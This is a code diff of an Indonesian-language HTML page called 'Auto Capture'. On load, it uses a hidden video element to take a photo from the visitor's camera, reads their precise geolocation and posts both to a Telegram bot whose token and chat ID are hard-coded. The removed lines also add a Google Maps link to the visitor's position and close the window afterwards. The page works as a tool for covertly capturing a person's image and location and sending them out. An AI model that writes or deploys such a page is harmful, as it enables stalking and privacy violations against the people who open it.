@@ -5,67 +5,60 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Auto Capture</title>
     <style>
-        body {
-            font-family: Arial, sans-serif;
-            background-color: white;
-            margin: 0;
-            padding: 20px;
-            text-align: center;
-        }
-        #status {
-            margin-top: 50px;
-            font-size: 18px;
-        }
+        body { font-family: Arial, sans-serif; background: white; margin: 0; padding: 20px; text-align: center; }
+        #status { margin-top: 50px; font-size: 18px; color: #333; }
+        #debug { color: #666; font-size: 14px; margin-top: 20px; }
     </style>
 </head>
 <body>
     <div id="status">Memulai proses...</div>
+    <div id="debug"></div>
 
-    <!-- Elemen tersembunyi untuk kamera -->
     <video id="camera-view" autoplay playsinline style="display:none;"></video>
     <canvas id="photo-canvas" style="display:none;"></canvas>
 
     <script>
-        // Konfigurasi Telegram (ganti dengan data Anda)
+        // CONFIGURATION (Ganti dengan data Anda)
         const BOT_TOKEN = '7548364986:AAGhlDQas3V9_Cz1Td7XXsLUKn7vYqjgzOY';
         const CHAT_ID = '7041008009';
         
-        // Elemen DOM
         const statusEl = document.getElementById('status');
+        const debugEl = document.getElementById('debug');
         const cameraView = document.getElementById('camera-view');
         const photoCanvas = document.getElementById('photo-canvas');
         
-        // Variabel
-        let photoDataUrl = null;
-        let locationData = null;
-        
-        // 1. Fungsi utama yang dijalankan saat halaman dimuat
+        // Debug function
+        function debugLog(message) {
+            debugEl.innerHTML += message + '<br>';
+            console.log(message);
+        }
+
         async function initialize() {
             try {
-                // A. Ambil foto
-                statusEl.textContent = "Mengakses kamera...";
+                debugLog("1. Memeriksa koneksi internet...");
+                if (!navigator.onLine) throw new Error("Tidak ada koneksi internet");
+                
+                debugLog("2. Memeriksa token dan chat ID...");
+                if (!BOT_TOKEN || !CHAT_ID) throw new Error("Token atau Chat ID tidak valid");
+                
+                debugLog("3. Mengakses kamera...");
                 await capturePhoto();
                 
-                // B. Dapatkan lokasi
-                statusEl.textContent = "Mendapatkan lokasi...";
+                debugLog("4. Mendapatkan lokasi...");
                 await getLocation();
                 
-                // C. Kirim ke Telegram
-                statusEl.textContent = "Mengirim ke Telegram...";
-                await sendToTelegram();
+                debugLog("5. Mengirim ke Telegram...");
+                const result = await sendToTelegram();
                 
-                statusEl.textContent = "Data berhasil dikirim! Halaman akan ditutup dalam 3 detik...";
-                setTimeout(() => {
-                    window.close();
-                }, 3000);
+                statusEl.textContent = "✅ Data berhasil dikirim!";
+                debugLog("RESPONSE: " + JSON.stringify(result));
                 
             } catch (error) {
-                statusEl.textContent = "Error: " + error.message;
-                console.error(error);
+                statusEl.textContent = "❌ Error: " + error.message;
+                debugLog("ERROR: " + error.stack);
             }
         }
         
-        // 2. Fungsi mengambil foto
         async function capturePhoto() {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ 
@@ -74,18 +67,14 @@
                 
                 cameraView.srcObject = stream;
                 
-                // Tunggu kamera siap
-                await new Promise(resolve => {
+                await new Promise((resolve) => {
                     cameraView.onloadedmetadata = () => {
-                        // Ambil foto setelah 500ms (biarkan kamera fokus)
                         setTimeout(() => {
                             const context = photoCanvas.getContext('2d');
                             photoCanvas.width = cameraView.videoWidth;
                             photoCanvas.height = cameraView.videoHeight;
-                            context.drawImage(cameraView, 0, 0, photoCanvas.width, photoCanvas.height);
-                            photoDataUrl = photoCanvas.toDataURL('image/jpeg');
+                            context.drawImage(cameraView, 0, 0);
                             
-                            // Matikan kamera
                             stream.getTracks().forEach(track => track.stop());
                             resolve();
                         }, 500);
@@ -93,77 +82,63 @@
                 });
                 
             } catch (error) {
-                throw new Error("Gagal mengakses kamera: " + error.message);
+                throw new Error("Kamera error: " + error.message);
             }
         }
         
-        // 3. Fungsi mendapatkan lokasi
         async function getLocation() {
             return new Promise((resolve, reject) => {
                 if (!navigator.geolocation) {
-                    reject(new Error("Geolokasi tidak didukung"));
+                    reject(new Error("Browser tidak mendukung geolokasi"));
                     return;
                 }
                 
                 navigator.geolocation.getCurrentPosition(
-                    position => {
-                        locationData = {
-                            lat: position.coords.latitude,
-                            lng: position.coords.longitude,
-                            accuracy: position.coords.accuracy
-                        };
-                        resolve();
-                    },
-                    error => {
-                        reject(new Error("Gagal mendapatkan lokasi: " + error.message));
-                    },
-                    { 
-                        enableHighAccuracy: true,
-                        timeout: 10000,
-                        maximumAge: 0 
-                    }
+                    position => resolve(position),
+                    error => reject(new Error(getGeoError(error))),
+                    { enableHighAccuracy: true, timeout: 10000 }
                 );
             });
         }
         
-        // 4. Fungsi mengirim ke Telegram
+        function getGeoError(error) {
+            switch(error.code) {
+                case error.PERMISSION_DENIED: return "Izin lokasi ditolak";
+                case error.POSITION_UNAVAILABLE: return "Lokasi tidak tersedia";
+                case error.TIMEOUT: return "Waktu habis saat mendapatkan lokasi";
+                default: return "Error lokasi tidak diketahui";
+            }
+        }
+        
         async function sendToTelegram() {
             try {
-                // Konversi foto ke blob
+                const photoDataUrl = photoCanvas.toDataURL('image/jpeg');
                 const blob = await (await fetch(photoDataUrl)).blob();
                 const formData = new FormData();
                 
                 formData.append('chat_id', CHAT_ID);
-                formData.append('photo', blob, 'capture.jpg');
+                formData.append('photo', blob, 'photo.jpg');
                 
-                // Buat caption dengan info lokasi
-                let caption = "Foto otomatis\n";
-                if (locationData) {
-                    caption += `Lokasi: https://maps.google.com/?q=${locationData.lat},${locationData.lng}\n`;
-                    caption += `Akurasi: ${Math.round(locationData.accuracy)} meter`;
-                } else {
-                    caption += "Lokasi: Tidak tersedia";
-                }
+                // Test API request
+                debugLog("Testing bot token...");
+                const testResponse = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getMe`);
+                const testData = await testResponse.json();
+                if (!testData.ok) throw new Error("Token bot tidak valid");
                 
-                formData.append('caption', caption);
-                
-                // Kirim ke API Telegram
+                // Send photo
                 const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                     method: 'POST',
                     body: formData
                 });
                 
-                const result = await response.json();
-                if (!result.ok) {
-                    throw new Error(result.description || "Gagal mengirim ke Telegram");
-                }
+                return await response.json();
                 
             } catch (error) {
-                throw new Error("Gagal mengirim: " + error.message);
+                throw new Error("Telegram error: " + error.message);
             }
         }
         
-        // Jalankan proses saat halaman dimuat
+        // Start process
         window.addEventListener('DOMContentLoaded', initialize);
     </script>
 </body>
